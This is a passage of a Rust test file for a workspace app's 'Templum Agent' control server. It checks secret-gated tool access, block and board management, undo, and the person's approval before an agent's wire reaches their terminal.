//! The Templum Agent: its control server, the gate, its engine and its chat
//! (docs/specs/templum-agent.md).

use serde_json::{Value, json};
use templum_mcp::{Hello, Incoming, Message};

use super::bus::{me, screen_with};
use super::*;

/// The workspace's answer to `method`, asked by a control client whose hello carries `secret`.
pub(super) fn control_as(
    handle: AnyWindowHandle,
    ws: &Entity<Workspace>,
    cx: &mut TestAppContext,
    secret: &str,
    method: &str,
    params: Value,
) -> Value {
    let (reply, answers) = std::sync::mpsc::channel();
    let message = Message {
        hello: Hello {
            terminal: String::new(),
            client: "control".into(),
            control: Some(secret.into()),
        },
        conn: 900,
        incoming: Incoming::Request {
            id: json!(1),
            method: method.into(),
            params,
        },
        reply,
    };
    cx.update_window(handle, |_, window, cx| {
        ws.update(cx, |ws, cx| ws.serve(message, window, cx))
    })
    .unwrap();
    serde_json::from_str(&answers.try_recv().expect("answered at once")).unwrap()
}

/// A control tool's answer, asked with the workspace's secret: whether it is an error, and its
/// text.
pub(super) fn control(
    handle: AnyWindowHandle,
    ws: &Entity<Workspace>,
    cx: &mut TestAppContext,
    tool: &str,
    arguments: Value,
) -> (bool, String) {
    let secret = ws.read_with(cx, |ws, _| ws.templum_agent.secret.clone());
    let answer = control_as(
        handle,
        ws,
        cx,
        &secret,
        "tools/call",
        json!({ "name": tool, "arguments": arguments }),
    );
    let result = &answer["result"];
    (
        result["isError"] == true,
        result["content"][0]["text"].as_str().unwrap().to_string(),
    )
}

#[gpui_kit::test]
fn a_control_client_with_the_secret_gets_every_workspace(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    let secret = ws.read_with(cx, |ws, _| ws.templum_agent.secret.clone());
    assert_eq!(secret.len(), 32);
    let init = control_as(
        handle,
        &ws,
        cx,
        &secret,
        "initialize",
        json!({"protocolVersion": "2025-11-25"}),
    );
    assert_eq!(init["result"]["serverInfo"]["name"], "templum-control");
    let text = init["result"]["instructions"].as_str().unwrap();
    assert!(
        text.contains(", shown: 1 block") && text.contains("Call overview for the blocks."),
        "{text}"
    );
    let tools = control_as(handle, &ws, cx, &secret, "tools/list", json!({}));
    let tools = tools["result"]["tools"].as_array().unwrap();
    assert!(tools.iter().any(|t| t["name"] == "overview"));
    assert!(!tools.iter().any(|t| t["name"] == "whoami"));
}

#[gpui_kit::test]
fn a_wrong_secret_is_not_the_templum_agent(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    let init = control_as(handle, &ws, cx, "old", "initialize", json!({}));
    assert_eq!(
        init["result"]["instructions"],
        "This isn't the Templum Agent's process."
    );
    let called = control_as(
        handle,
        &ws,
        cx,
        "old",
        "tools/call",
        json!({"name": "overview", "arguments": {}}),
    );
    assert_eq!(called["result"]["isError"], true);
    assert_eq!(
        called["result"]["content"][0]["text"],
        "This isn't the Templum Agent's process."
    );
    // A block's own server never reaches the control tools.
    let first = first_id(&ws, cx);
    let terminal = me(&ws, cx, first).0;
    let answer = super::bus::ask_as(
        handle,
        &ws,
        cx,
        &terminal,
        "mcp",
        "tools/call",
        json!({"name": "overview", "arguments": {}}),
    );
    assert_eq!(answer["error"]["message"], "Unknown tool: overview");
}

#[gpui_kit::test]
fn overview_lists_the_blocks_of_every_workspace(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    let (first, first_uid) = ws.read_with(cx, |ws, _| {
        (
            ws.space.id.clone(),
            ws.space.uids[&ws.space.canvas.top().unwrap()].clone(),
        )
    });
    cx.update_window(handle, |_, window, cx| {
        ws.update(cx, |ws, cx| {
            ws.new_space(window, cx);
            ws.new_terminal(window, cx);
        })
    })
    .unwrap();
    let (second, second_uid) = ws.read_with(cx, |ws, _| {
        (
            ws.space.id.clone(),
            ws.space.uids[&ws.space.canvas.top().unwrap()].clone(),
        )
    });
    let (failed, text) = control(handle, &ws, cx, "overview", json!({}));
    assert!(!failed, "{text}");
    assert!(text.contains(&format!("({first})")), "{text}");
    assert!(text.contains(&format!("({second}), shown")), "{text}");
    assert!(text.contains(&format!("{first_uid}  terminal")), "{text}");
    assert!(text.contains(&format!("{second_uid}  terminal")), "{text}");
}

#[gpui_kit::test]
fn the_reads_need_no_wire(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    let (_, note, terminal) = three_blocks(handle, &ws, cx);
    let (note_uid, terminal_uid) = ws.read_with(cx, |ws, _| {
        (
            ws.space.uids[&note].clone(),
            ws.space.uids[&terminal].clone(),
        )
    });
    ws.read_with(cx, |ws, _| {
        ws.space
            .terminal(terminal)
            .unwrap()
            .term
            .write(b"printed\r".to_vec())
    });
    screen_with(&ws, cx, terminal, "printed");
    assert_eq!(
        control(handle, &ws, cx, "read_note", json!({ "block": note_uid })),
        (false, "hello".to_string())
    );
    let (failed, text) = control(
        handle,
        &ws,
        cx,
        "read_terminal",
        json!({ "block": terminal_uid }),
    );
    assert!(!failed && text.contains("printed"), "{text}");
    let (failed, text) = control(handle, &ws, cx, "read_note", json!({ "block": "nope1" }));
    assert!(failed, "{text}");
    assert_eq!(text, "There's no block nope1: overview lists them.");
    let (failed, text) = control(handle, &ws, cx, "list_agents", json!({}));
    assert!(!failed && text.contains("claude"), "{text}");
}

#[gpui_kit::test]
fn cards_go_on_any_board_and_comments_are_signed_templum_agent(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    let board = ws.update(cx, |ws, _| {
        let board = ws.edit_boards(crate::board::Boards::add_board);
        ws.edit_boards(|b| b.rename_board(board, "Sprint"));
        board
    });
    let (failed, text) = control(
        handle,
        &ws,
        cx,
        "create_card",
        json!({"board": "sprint", "title": "Login", "checklist": "One\nTwo"}),
    );
    assert!(!failed, "{text}");
    let card: u64 = text
        .strip_prefix("Created card ")
        .and_then(|t| t.strip_suffix('.'))
        .unwrap()
        .parse()
        .unwrap();
    assert_eq!(
        ws.read_with(cx, |ws, _| ws.boards.find_card(card).map(|(b, _)| b)),
        Some(board)
    );
    let last = ws.read_with(cx, |ws, _| {
        ws.boards
            .board(board)
            .unwrap()
            .columns
            .last()
            .unwrap()
            .title
            .clone()
    });
    assert_eq!(
        control(
            handle,
            &ws,
            cx,
            "move_card",
            json!({"card": card, "column": last})
        ),
        (false, format!("Moved card {card} to {last}.")),
        "no comment asked of the Templum Agent"
    );
    let (failed, text) = control(
        handle,
        &ws,
        cx,
        "comment_card",
        json!({"card": card, "text": "Done by Codex."}),
    );
    assert!(!failed, "{text}");
    let by = ws.read_with(cx, |ws, _| {
        ws.boards.card(board, card).unwrap().comments[0].by.clone()
    });
    assert_eq!(by, ::templum_agent::ASKER);
    let (failed, text) = control(
        handle,
        &ws,
        cx,
        "edit_card",
        json!({"card": card, "priority": "high"}),
    );
    assert!(!failed, "{text}");
    let (failed, whole) = control(handle, &ws, cx, "list_cards", json!({"card": card}));
    assert!(!failed, "{whole}");
    assert!(
        whole.contains("by Templum Agent") && whole.contains("priority high"),
        "{whole}"
    );
    let (failed, text) = control(handle, &ws, cx, "list_cards", json!({}));
    assert!(
        !failed && text.starts_with("Board \"Sprint\""),
        "the only board: {text}"
    );
    ws.update(cx, |ws, _| ws.edit_boards(crate::board::Boards::add_board));
    let (failed, text) = control(handle, &ws, cx, "list_cards", json!({}));
    assert!(failed && text.contains("Name one with board"), "{text}");
    let (failed, text) = control(handle, &ws, cx, "list_cards", json!({"board": board}));
    assert!(!failed && text.starts_with("Board \"Sprint\""), "{text}");
}

#[gpui_kit::test]
fn notes_and_checklists_take_writes_without_a_wire(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    let (_, note, _) = three_blocks(handle, &ws, cx);
    let note_uid = ws.read_with(cx, |ws, _| ws.space.uids[&note].clone());
    let (failed, text) = control(
        handle,
        &ws,
        cx,
        "append_note",
        json!({"block": note_uid, "text": "plan"}),
    );
    assert!(!failed, "{text}");
    cx.run_until_parked();
    let shown = ws.read_with(cx, |ws, cx| {
        ws.space.blocks[&note]
            .note()
            .unwrap()
            .tab()
            .unwrap()
            .editor
            .read(cx)
            .value()
            .to_string()
    });
    assert_eq!(shown, "hello\n\nplan");
    cx.update_window(handle, |_, window, cx| {
        window.activate_window();
        window.render_frame(cx);
        window.click("tool-checklist", cx);
        window.render_frame(cx);
    })
    .unwrap();
    let list = ws.read_with(cx, |ws, _| {
        let id = ws.space.canvas.top().unwrap();
        (
            ws.space.uids[&id].clone(),
            ws.space.blocks[&id].checklist().unwrap().list.unwrap(),
        )
    });
    let (failed, text) = control(
        handle,
        &ws,
        cx,
        "add_items",
        json!({"block": list.0, "text": "One\nTwo"}),
    );
    assert!(!failed, "{text}");
    let first = ws.read_with(cx, |ws, _| ws.checklists.get(list.1).unwrap().items[0].id);
    let (failed, text) = control(
        handle,
        &ws,
        cx,
        "check_item",
        json!({"block": list.0, "item": first}),
    );
    assert!(!failed, "{text}");
    let (failed, text) = control(handle, &ws, cx, "read_checklist", json!({"block": list.0}));
    assert!(
        !failed && text.contains("(1/2)") && text.contains("[x] One"),
        "{text}"
    );
}

/// What the person has: the shown workspace, its focused block and its camera.
fn person_view(
    ws: &Entity<Workspace>,
    cx: &mut TestAppContext,
) -> (String, Option<BlockId>, Camera) {
    ws.read_with(cx, |ws, _| {
        (
            ws.space.id.clone(),
            ws.space.focused,
            ws.space.canvas.camera,
        )
    })
}

/// A tool's answer that names an id last, as `(w2).` or `as b7k2m`: that id.
fn id_in(text: &str) -> String {
    text.trim_end_matches('.')
        .rsplit(['(', ' '])
        .next()
        .unwrap()
        .trim_end_matches(')')
        .to_string()
}

#[gpui_kit::test]
fn create_workspace_makes_one_without_showing_it(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    let before = person_view(&ws, cx);
    let dir = tempfile::tempdir().unwrap();
    let (failed, text) = control(
        handle,
        &ws,
        cx,
        "create_workspace",
        json!({"name": "API", "folder": dir.path(), "color": "blue"}),
    );
    assert_eq!(
        (failed, text.as_str()),
        (false, "Created workspace API (w2).")
    );
    assert_eq!(person_view(&ws, cx), before);
    ws.read_with(cx, |ws, _| {
        let space = ws.space_named("w2").unwrap();
        assert_eq!(space.name, "API");
        assert_eq!(space.folder.as_deref(), Some(dir.path()));
        assert_eq!(space.look.color.as_deref(), Some("blue"));
        assert_eq!(ws.templum_agent.conversation.own.workspaces, ["w2"]);
    });
    let (failed, text) = control(
        handle,
        &ws,
        cx,
        "create_workspace",
        json!({"name": "X", "color": "#ff0000"}),
    );
    assert!(failed && text.contains("red, yellow, green"), "{text}");
}

/// `add_block`'s `shell` opens a shell of this computer's own list, by the name `list_shells`
/// gives it: never a program the caller names (kanban card 201).
#[gpui_kit::test]
fn add_block_opens_only_a_shell_list_shells_names(cx: &mut TestAppContext) {
    use templum_terminal::ShellOption;
    let (handle, ws) = open(cx);
    let folder = tempfile::tempdir().unwrap();
    control(
        handle,
        &ws,
        cx,
        "create_workspace",
        json!({"name": "API", "folder": folder.path()}),
    );
    let (program, args) = quiet();
    let quiet_shell = ShellOption {
        label: "Quiet".into(),
        program,
        args,
    };
    ws.update(cx, |ws, _| {
        ws.config.shell.program = None;
        ws.default_shell = "zsh".into();
        ws.shells_early = false;
        ws.shells = vec![quiet_shell.clone()];
    });
    let (failed, text) = control(handle, &ws, cx, "list_shells", json!({}));
    assert!(!failed, "{text}");
    assert_eq!(text, "zsh  default\nQuiet");
    let add = |cx: &mut TestAppContext, shell: &str| {
        control(
            handle,
            &ws,
            cx,
            "add_block",
            json!({"workspace": "w2", "kind": "terminal", "shell": shell}),
        )
    };
    let (failed, text) = add(cx, "Quiet");
    assert!(!failed, "{text}");
    let uid = id_in(&text);
    let terminals = |cx: &mut TestAppContext| {
        ws.read_with(cx, |ws, _| {
            ws.space_named("w2").unwrap().terminals().count()
        })
    };
    ws.read_with(cx, |ws, _| {
        let space = ws.space_named("w2").unwrap();
        let pane = space.terminal(space.block_by_uid(&uid).unwrap()).unwrap();
        assert_eq!(pane.shell.as_ref(), Some(&quiet_shell));
    });
    let before = terminals(cx);
    let (failed, text) = add(cx, "fish");
    assert!(failed);
    assert_eq!(text, "There's no shell \"fish\": list_shells lists them.");
    // Its program, or another case of its name, is no name of the list.
    for shell in ["/bin/sh", &quiet_shell.program.clone(), "quiet"] {
        let (failed, text) = add(cx, shell);
        assert!(failed, "{shell}: {text}");
        assert!(text.ends_with(": list_shells lists them."), "{text}");
    }
    assert_eq!(terminals(cx), before, "nothing opened");
}

#[gpui_kit::test]
fn add_block_opens_each_kind_where_it_covers_nothing(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    let folder = tempfile::tempdir().unwrap();
    control(
        handle,
        &ws,
        cx,
        "create_workspace",
        json!({"name": "API", "folder": folder.path()}),
    );
    let before = person_view(&ws, cx);
    let (failed, text) = control(
        handle,
        &ws,
        cx,
        "add_block",
        json!({"workspace": "api", "kind": "kanban", "board": "Sprint"}),
    );
    assert!(!failed, "{text}");
    let kanban = id_in(&text);
    let mut uids = vec![kanban.clone()];
    for args in [
        json!({"workspace": "w2", "kind": "note", "text": "plan", "near": kanban}),
        json!({"workspace": "w2", "kind": "checklist", "text": "Steps\nOne\nTwo"}),
        json!({"workspace": "w2", "kind": "terminal"}),
        json!({"workspace": "w2", "kind": "editor", "folder": folder.path()}),
    ] {
        let (failed, text) = control(handle, &ws, cx, "add_block", args);
        assert!(!failed, "{text}");
        uids.push(id_in(&text));
    }
    assert_eq!(
        person_view(&ws, cx),
        before,
        "the person's view and keyboard stay"
    );
    ws.read_with(cx, |ws, cx| {
        let space = ws.space_named("w2").unwrap();
        let rects: Vec<Rect> = uids
            .iter()
            .map(|uid| {
                space
                    .canvas
                    .get(space.block_by_uid(uid).unwrap())
                    .unwrap()
                    .rect
            })
            .collect();
        for (i, a) in rects.iter().enumerate() {
            for b in &rects[i + 1..] {
                assert!(!a.intersects(b), "{a:?} and {b:?} overlap");
            }
        }
        // The note sits beside the kanban.
        let (k, n) = (rects[0], rects[1]);
        let gap = (n.x - (k.x + k.w)).abs().min((k.x - (n.x + n.w)).abs());
        let gap = gap
            .min((n.y - (k.y + k.h)).abs())
            .min((k.y - (n.y + n.h)).abs());
        assert!(gap <= templum_canvas::BESIDE + 1.0, "{k:?} {n:?}");
        let board = space
            .kanban(space.block_by_uid(&uids[0]).unwrap())
            .unwrap()
            .board
            .unwrap();
        let b = ws.boards.board(board).unwrap();
        assert_eq!(b.name, "Sprint");
        let columns: Vec<&str> = b.columns.iter().map(|c| c.title.as_str()).collect();
        assert_eq!(columns, ["To do", "Doing", "Review", "Done"]);
        let note = space.blocks[&space.block_by_uid(&uids[1]).unwrap()]
            .note()
            .unwrap();
        assert_eq!(note.tab().unwrap().editor.read(cx).value().as_ref(), "plan");
        let list = space.blocks[&space.block_by_uid(&uids[2]).unwrap()]
            .checklist()
            .unwrap();
        let list = ws.checklists.get(list.list.unwrap()).unwrap();
        assert_eq!(list.name_shown(), "Steps");
        assert_eq!(list.items.len(), 2);
        assert!(
            space
                .terminal(space.block_by_uid(&uids[3]).unwrap())
                .is_some()
        );
        assert_eq!(ws.templum_agent.conversation.own.blocks, uids);
    });
    // A kanban on a board that is there shows it.
    let (failed, text) = control(
        handle,
        &ws,
        cx,
        "add_block",
        json!({"workspace": "w2", "kind": "kanban", "board": "sprint"}),
    );
    assert!(!failed, "{text}");
    assert_eq!(ws.read_with(cx, |ws, _| ws.boards.boards.len()), 1);
}

#[gpui_kit::test]
fn a_stopped_workspace_is_refused(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    control(handle, &ws, cx, "create_workspace", json!({"name": "API"}));
    cx.update_window(handle, |_, window, cx| {
        ws.update(cx, |ws, cx| ws.stop_now("w2", window, cx))
    })
    .unwrap();
    let (failed, text) = control(
        handle,
        &ws,
        cx,
        "add_block",
        json!({"workspace": "API", "kind": "note"}),
    );
    assert_eq!(
        (failed, text.as_str()),
        (true, "Workspace API is stopped: show it first (show).")
    );
    assert!(ws.read_with(cx, |ws, _| {
        ws.space_named("w2").unwrap().canvas.blocks().is_empty()
    }));
    let (failed, text) = control(handle, &ws, cx, "show", json!({"workspace": "API"}));
    assert!(!failed, "{text}");
    let (failed, text) = control(
        handle,
        &ws,
        cx,
        "add_block",
        json!({"workspace": "API", "kind": "note"}),
    );
    assert!(!failed, "{text}");
}

#[gpui_kit::test]
fn show_switches_and_reveals(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    control(handle, &ws, cx, "create_workspace", json!({"name": "API"}));
    let (_, text) = control(
        handle,
        &ws,
        cx,
        "add_block",
        json!({"workspace": "w2", "kind": "note"}),
    );
    let note = id_in(&text);
    let (failed, text) = control(handle, &ws, cx, "show", json!({"block": note}));
    assert!(!failed, "{text}");
    ws.read_with(cx, |ws, _| {
        assert_eq!(ws.space.id, "w2");
        assert_eq!(ws.space.focused, ws.space.block_by_uid(&note));
    });
    let (failed, text) = control(handle, &ws, cx, "show", json!({"workspace": "nowhere"}));
    assert!(
        failed && text.contains("There's no workspace nowhere"),
        "{text}"
    );
}

#[gpui_kit::test]
fn connect_wires_two_blocks_and_ctrl_z_takes_it_back(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    let (kanban, note, terminal) = three_blocks(handle, &ws, cx);
    let (a, b, t) = ws.read_with(cx, |ws, _| {
        (
            ws.space.uids[&kanban].clone(),
            ws.space.uids[&note].clone(),
            ws.space.uids[&terminal].clone(),
        )
    });
    let (failed, text) = control(handle, &ws, cx, "connect", json!({"a": a, "b": t}));
    assert!(!failed, "{text}");
    assert!(ws.read_with(cx, |ws, _| ws.space.wired(kanban, terminal)));
    cx.update_window(handle, |_, window, cx| {
        window.press(UNDO, cx);
        window.render_frame(cx);
    })
    .unwrap();
    assert!(
        !ws.read_with(cx, |ws, _| ws.space.wired(kanban, terminal)),
        "Ctrl+Z unwires"
    );
    control(handle, &ws, cx, "connect", json!({"a": b, "b": t}));
    let (failed, text) = control(handle, &ws, cx, "disconnect", json!({"a": t, "b": b}));
    assert!(!failed, "{text}");
    assert!(!ws.read_with(cx, |ws, _| ws.space.wired(note, terminal)));
    control(handle, &ws, cx, "create_workspace", json!({"name": "API"}));
    let (_, text) = control(
        handle,
        &ws,
        cx,
        "add_block",
        json!({"workspace": "w2", "kind": "note"}),
    );
    let far = id_in(&text);
    let (failed, text) = control(handle, &ws, cx, "connect", json!({"a": a, "b": far}));
    assert_eq!(
        (failed, text),
        (true, format!("{a} and {far} aren't in one workspace."))
    );
}

#[gpui_kit::test]
fn move_block_moves_and_ctrl_z_puts_it_back(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    let (_, note, _) = three_blocks(handle, &ws, cx);
    let uid = ws.read_with(cx, |ws, _| ws.space.uids[&note].clone());
    let rect =
        |cx: &mut TestAppContext| ws.read_with(cx, |ws, _| ws.space.canvas.get(note).unwrap().rect);
    let before = rect(cx);
    let (failed, text) = control(
        handle,
        &ws,
        cx,
        "move_block",
        json!({"block": uid, "x": 120, "y": 80, "w": 640, "h": 400}),
    );
    assert_eq!(
        (failed, text),
        (false, format!("Moved {uid} to 120,80 640×400."))
    );
    assert_eq!(
        rect(cx),
        templum_canvas::Rect::new(120.0, 80.0, 640.0, 400.0)
    );
    // What is left out keeps; a size below the kind's least is raised to it.
    let (failed, text) = control(
        handle,
        &ws,
        cx,
        "move_block",
        json!({"block": uid, "x": 5, "w": 1}),
    );
    assert!(!failed, "{text}");
    let least = ws.read_with(cx, |ws, _| ws.space.blocks[&note].min_size(ws.cell.size));
    assert_eq!(
        rect(cx),
        templum_canvas::Rect::new(5.0, 80.0, least.w, 400.0)
    );
    let undo = |cx: &mut TestAppContext| {
        cx.update_window(handle, |_, window, cx| {
            window.press(UNDO, cx);
            window.render_frame(cx);
        })
        .unwrap();
    };
    undo(cx);
    assert_eq!(
        rect(cx),
        templum_canvas::Rect::new(120.0, 80.0, 640.0, 400.0)
    );
    undo(cx);
    assert_eq!(rect(cx), before, "Ctrl+Z puts it back");
    let (failed, text) = control(
        handle,
        &ws,
        cx,
        "move_block",
        json!({"block": "nope", "x": 1}),
    );
    assert_eq!(
        (failed, text),
        (
            true,
            "There's no block nope: overview lists them.".to_string()
        )
    );
}

#[gpui_kit::test]
fn move_block_in_a_hidden_workspace_steps_that_workspaces_history(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    control(handle, &ws, cx, "create_workspace", json!({"name": "API"}));
    let (_, text) = control(
        handle,
        &ws,
        cx,
        "add_block",
        json!({"workspace": "w2", "kind": "note"}),
    );
    let far = id_in(&text);
    let rect = |cx: &mut TestAppContext| {
        ws.read_with(cx, |ws, _| {
            let space = ws.space_named("w2").unwrap();
            space
                .canvas
                .get(space.block_by_uid(&far).unwrap())
                .unwrap()
                .rect
        })
    };
    let before = rect(cx);
    let (failed, text) = control(
        handle,
        &ws,
        cx,
        "move_block",
        json!({"block": far, "x": 900, "y": 900}),
    );
    assert!(!failed, "{text}");
    assert_eq!((rect(cx).x, rect(cx).y), (900.0, 900.0));
    let undo = |cx: &mut TestAppContext| {
        cx.update_window(handle, |_, window, cx| {
            window.press(UNDO, cx);
            window.render_frame(cx);
        })
        .unwrap();
    };
    undo(cx);
    assert_eq!(
        (rect(cx).x, rect(cx).y),
        (900.0, 900.0),
        "the shown workspace's undo leaves it"
    );
    control(handle, &ws, cx, "show", json!({"workspace": "w2"}));
    undo(cx);
    assert_eq!(rect(cx), before, "its own workspace's undo puts it back");
}

#[gpui_kit::test]
fn a_wire_that_reaches_your_terminal_asks(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    let (kanban, _, mine) = three_blocks(handle, &ws, cx);
    let (_, other) = busy_terminal(handle, &ws, cx);
    let (_, own) = busy_terminal(handle, &ws, cx);
    let (_, own2) = busy_terminal(handle, &ws, cx);
    let (mine, kanban, space) = ws.update(cx, |ws, _| {
        let own_blocks = &mut ws.templum_agent.conversation.own.blocks;
        own_blocks.extend([own.clone(), own2.clone()]);
        let uid = |id| ws.space.uids[&id].clone();
        (uid(mine), uid(kanban), ws.space.id.clone())
    });
    // Its own agents, and boards: at once.
    let (failed, text) = control(handle, &ws, cx, "connect", json!({"a": own, "b": own2}));
    assert!(!failed, "{text}");
    let (failed, text) = control(handle, &ws, cx, "connect", json!({"a": own, "b": kanban}));
    assert!(!failed, "{text}");
    // Its agent to the person's terminal, or two of theirs: the person says.
    let waiting = control_later(handle, &ws, cx, 7, "connect", json!({"a": own, "b": mine}));
    assert!(waiting.try_recv().is_err(), "it waits");
    ws.read_with(cx, |ws, _| {
        let front = &ws.templum_agent.approvals[0];
        assert!(front.said.starts_with("Wire "), "{}", front.said);
        assert!(
            front.details.ends_with("and answer its dialogs."),
            "{}",
            front.details
        );
    });
    answer(handle, &ws, cx, crate::chat::Answer::Deny(None));
    let (failed, _) = super::bus::result_of(&waiting.try_recv().unwrap());
    assert!(failed);
    let both = control_later(
        handle,
        &ws,
        cx,
        8,
        "connect",
        json!({"a": mine, "b": other}),
    );
    assert!(both.try_recv().is_err());
    ws.read_with(cx, |ws, _| {
        let details = &ws.templum_agent.approvals[0].details;
        assert!(details.contains("can type into each other"), "{details}");
    });
    answer(handle, &ws, cx, crate::chat::Answer::Deny(None));
    // An agent it opens wired to the person's terminal, too.
    let opening = json!({"agent": "claude", "workspace": space, "connect": [kanban, mine]});
    let opened = control_later(handle, &ws, cx, 9, "open_agent", opening);
    assert!(opened.try_recv().is_err());
    ws.read_with(cx, |ws, _| {
        let front = &ws.templum_agent.approvals[0];
        assert!(front.said.starts_with("Open "), "{}", front.said);
        assert!(
            front.details.starts_with("It can type into"),
            "{}",
            front.details
        );
    });
}

/// A wire between two of the person's terminals is about both: when the second changed since the
/// person looked, Allow wires nothing and asks again.
#[gpui_kit::test]
fn a_wire_asks_again_when_either_end_changed(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    let (_, a) = busy_terminal(handle, &ws, cx);
    let (b, b_uid) = busy_terminal(handle, &ws, cx);
    let waiting = control_later(handle, &ws, cx, 7, "connect", json!({"a": a, "b": b_uid}));
    let terminal = ws.read_with(cx, |ws, _| {
        ws.space.terminal(b).unwrap().term.id().to_string()
    });
    let asks = json!({ "event": "needs_you", "message": "Allow Bash?" });
    super::bus::event(handle, &ws, cx, &terminal, asks);
    answer(handle, &ws, cx, crate::chat::Answer::Once);
    assert!(waiting.try_recv().is_err(), "it still waits");
    ws.read_with(cx, |ws, _| {
        assert!(ws.space.wires.is_empty(), "no wire");
        assert!(ws.templum_agent.approvals[0].changed);
    });
}

/// Claude Code and Codex started as `cat` in front of new terminals' shells, their input boxes
/// bracketing pastes (as the spawn tests' `spawner`).
#[cfg(unix)]
pub(super) fn cat_agents(ws: &Entity<Workspace>, cx: &mut TestAppContext) {
    ws.update(cx, |ws, _| {
        ws.command = Some(jobs("printf '\\033[?2004h'; cat; true"));
        for agent in &mut ws.agents {
            if agent.id == "claude" || agent.id == "codex" {
                agent.command = "cat".into();
            }
        }
    });
}

/// The block id an `open_agent` answer names: `Opened … as <uid> in …`.
#[cfg(unix)]
fn opened_uid(text: &str) -> String {
    text.split(" as ")
        .nth(1)
        .unwrap()
        .split(' ')
        .next()
        .unwrap()
        .to_string()
}

#[cfg(unix)]
#[gpui_kit::test]
fn open_agent_opens_in_a_workspace_not_shown_wired_to_its_board(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    cat_agents(&ws, cx);
    let folder = tempfile::tempdir().unwrap();
    control(
        handle,
        &ws,
        cx,
        "create_workspace",
        json!({"name": "API", "folder": folder.path()}),
    );
    let (_, text) = control(
        handle,
        &ws,
        cx,
        "add_block",
        json!({"workspace": "w2", "kind": "kanban", "board": "Sprint"}),
    );
    let kanban = id_in(&text);
    let before = person_view(&ws, cx);
    let (failed, text) = control(
        handle,
        &ws,
        cx,
        "open_agent",
        json!({"agent": "codex", "workspace": "API", "connect": [kanban], "near": kanban,
               "model": "gpt-5.6", "effort": "high"}),
    );
    assert!(!failed, "{text}");
    let uid = opened_uid(&text);
    assert_eq!(
        text,
        format!(
            "Opened Codex as {uid} in {}, on gpt-5.6 (high), connected to {kanban}.",
            folder.path().display()
        )
    );
    assert_eq!(
        person_view(&ws, cx),
        before,
        "the person's view and keyboard stay"
    );
    ws.read_with(cx, |ws, _| {
        let space = ws.space_named("w2").unwrap();
        let (id, board) = (
            space.block_by_uid(&uid).unwrap(),
            space.block_by_uid(&kanban).unwrap(),
        );
        assert!(space.wired(id, board));
        let pane = space.terminal(id).unwrap();
        assert_eq!(pane.opened_by.as_deref(), Some(::templum_agent::ASKER));
        assert_eq!(
            (pane.model.as_deref(), pane.effort.as_deref()),
            (Some("gpt-5.6"), Some("high"))
        );
        assert!(ws.templum_agent.conversation.own.blocks.contains(&uid));
    });
}

#[cfg(unix)]
#[gpui_kit::test]
fn two_identical_open_agent_rows_each_get_their_own_block(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    cat_agents(&ws, cx);
    let folder = tempfile::tempdir().unwrap();
    let shown = ws.read_with(cx, |ws, _| ws.space.id.clone());
    let args = json!({"agent": "codex", "workspace": shown, "folder": folder.path()});
    ws.update(cx, |ws, _| {
        for n in 0..2 {
            ws.templum_agent
                .conversation
                .rows
                .push(::templum_agent::Row::Action {
                    id: format!("t{n}"),
                    tool: "open_agent".into(),
                    input: args.clone(),
                    state: ::templum_agent::ActionState::Running,
                    said: String::new(),
                    target: None,
                });
        }
    });
    let uids: Vec<String> = (0..2)
        .map(|_| {
            let (failed, text) = control(handle, &ws, cx, "open_agent", args.clone());
            assert!(!failed, "{text}");
            opened_uid(&text)
        })
        .collect();
    ws.read_with(cx, |ws, _| {
        let blocks: Vec<_> = ws
            .templum_agent
            .conversation
            .rows
            .iter()
            .filter_map(|row| match row {
                ::templum_agent::Row::Action { target, .. } => {
                    target.as_ref().and_then(|t| t.block.clone())
                }
                _ => None,
            })
            .collect();
        assert_eq!(blocks, uids);
    });
}

#[cfg(unix)]
#[gpui_kit::test]
fn its_prompt_is_typed_under_the_templum_agents_line(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    cat_agents(&ws, cx);
    let folder = tempfile::tempdir().unwrap();
    let shown = ws.read_with(cx, |ws, _| ws.space.id.clone());
    let (failed, text) = control(
        handle,
        &ws,
        cx,
        "open_agent",
        json!({"agent": "codex", "workspace": shown, "folder": folder.path(), "prompt": "say hi"}),
    );
    assert!(!failed, "{text}");
    assert!(
        text.ends_with(" Its prompt is typed once it is ready, as task t1."),
        "{text}"
    );
    let new = ws.read_with(cx, |ws, _| {
        ws.space.block_by_uid(&opened_uid(&text)).unwrap()
    });
    in_front(&ws, cx, new, true);
    super::delegate::found(&ws, cx, new);
    let look = crate::workspace::spawn::READY_LOOK.as_millis() as u64;
    let mut looks = 0;
    while ws.read_with(cx, |ws, _| ws.space.terminal(new).unwrap().prompt.is_some()) {
        assert!(looks < 10, "never typed");
        std::thread::sleep(std::time::Duration::from_millis(100));
        super::bus::after(cx, look);
        looks += 1;
    }
    screen_with(&ws, cx, new, "[from Templum Agent, task t1]");
    let by = ws.read_with(cx, |ws, _| {
        ws.space
            .terminal(new)
            .unwrap()
            .handed
            .as_ref()
            .unwrap()
            .by
            .clone()
    });
    assert_eq!(by, ::templum_agent::ASKER);
}

#[gpui_kit::test]
fn an_unknown_agent_or_a_bad_effort_opens_nothing(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    // Claude Code as a program every computer has: refused for its connection, not for being
    // missing.
    ws.update(cx, |ws, _| {
        let claude = ws.agents.iter_mut().find(|a| a.id == "claude").unwrap();
        claude.command = if cfg!(windows) { "cmd" } else { "sh" }.into();
    });
    let shown = ws.read_with(cx, |ws, _| ws.space.id.clone());
    let blocks = |ws: &Entity<Workspace>, cx: &mut TestAppContext| {
        ws.read_with(cx, |ws, _| ws.space.canvas.blocks().len())
    };
